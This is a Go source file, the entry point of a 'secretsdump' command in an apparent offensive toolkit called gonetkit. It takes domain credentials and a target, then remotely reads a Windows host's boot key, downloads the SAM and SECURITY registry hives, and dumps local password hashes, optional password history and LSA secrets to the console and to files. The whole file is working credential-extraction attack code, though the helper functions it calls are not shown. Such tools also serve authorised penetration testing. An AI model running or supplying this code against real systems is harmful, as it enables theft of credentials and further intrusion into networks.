package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/joda32/gonetkit/internal/credentials"
)

func main() {
	creds := &credentials.Credentials{}

	var outputFile, share string
	var history, noCleanup bool
	flag.StringVar(&outputFile, "outputfile", "", "Write output to file (base name, extensions added per category)")
	flag.StringVar(&share, "share", "ADMIN$", "Share for temp file staging")
	flag.BoolVar(&history, "history", false, "Dump password history")
	flag.BoolVar(&noCleanup, "no-cleanup", false, "Don't stop/restore RemoteRegistry service on exit")
	creds.RegisterFlags(flag.CommandLine)

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "secretsdump - Extract hashes from remote Windows hosts\n\n")
		fmt.Fprintf(os.Stderr, "Usage: secretsdump [options] [[domain/]username[:password]@]<target>\n\n")
		flag.PrintDefaults()
	}

	flag.Parse()

	if flag.NArg() < 1 {
		flag.Usage()
		os.Exit(1)
	}

	creds.ParseTarget(flag.Arg(0))
	creds.PromptPassword()

	if err := run(creds, share, outputFile, history, noCleanup); err != nil {
		fmt.Fprintf(os.Stderr, "[-] %v\n", err)
		os.Exit(1)
	}
}

func run(creds *credentials.Credentials, share, outputFile string, history, noCleanup bool) error {
	fmt.Fprintf(os.Stderr, "[*] Target: %s\n", creds.TargetIP)

	ops, err := NewRemoteOps(creds, share)
	if err != nil {
		return err
	}
	ops.noCleanup = noCleanup
	defer ops.Cleanup()

	bootKey, err := ops.GetBootKey()
	if err != nil {
		return fmt.Errorf("bootkey: %w", err)
	}
	if creds.Debug {
		fmt.Fprintf(os.Stderr, "[*] Boot key: %x\n", bootKey)
	}

	var writers []outputWriter
	if outputFile != "" {
		defer func() {
			for _, w := range writers {
				w.Close()
			}
		}()
	}

	samData, err := ops.SaveAndDownloadHive("SAM")
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] SAM: %v\n", err)
	} else {
		fmt.Fprintln(os.Stderr, "[*] Dumping local SAM hashes")
		w := newOutputWriter(outputFile, ".sam")
		writers = append(writers, w)
		if err := DumpSAM(samData, bootKey, w, history); err != nil {
			fmt.Fprintf(os.Stderr, "[-] SAM dump error: %v\n", err)
		}
	}

	secData, err := ops.SaveAndDownloadHive("SECURITY")
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] SECURITY: %v\n", err)
	} else {
		fmt.Fprintln(os.Stderr, "[*] Dumping LSA secrets")
		w := newOutputWriter(outputFile, ".lsa")
		writers = append(writers, w)
		if err := DumpLSA(secData, bootKey, w, history); err != nil {
			fmt.Fprintf(os.Stderr, "[-] LSA dump error: %v\n", err)
		}
	}

	return nil
}

type outputWriter struct {
	file *os.File
}

func newOutputWriter(baseName, suffix string) outputWriter {
	if baseName == "" {
		return outputWriter{}
	}
	f, err := os.Create(baseName + suffix)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Cannot create %s: %v\n", baseName+suffix, err)
		return outputWriter{}
	}
	return outputWriter{file: f}
}

func (w outputWriter) Write(line string) {
	fmt.Println(line)
	if w.file != nil {
		fmt.Fprintln(w.file, line)
	}
}

func (w outputWriter) Close() {
	if w.file != nil {
		w.file.Close()
	}
}
